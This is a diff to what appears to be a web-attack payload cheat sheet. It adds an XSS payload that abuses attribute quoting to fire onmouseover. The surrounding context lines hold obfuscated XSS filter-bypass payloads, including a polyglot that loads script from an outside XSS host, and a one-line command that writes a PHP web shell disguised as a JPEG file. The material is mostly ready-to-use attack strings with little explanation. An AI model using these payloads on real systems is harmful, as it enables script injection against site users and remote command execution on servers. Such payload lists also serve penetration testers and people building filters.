@@ -45,6 +45,14 @@ Double quote and single quote bypass:
 <xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>
 
 '"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//zaggeb.xSs.ht></scripT>
+
+
+<xhzeem  attr="
+--- 
+x="=='='onmouseover=confirm`xhzeem` style="display:block;width:1000px;height:1000px;background:red">
+--- 
+">
+
 ------
 RCE payload to creating image:
 echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > shell.jpg
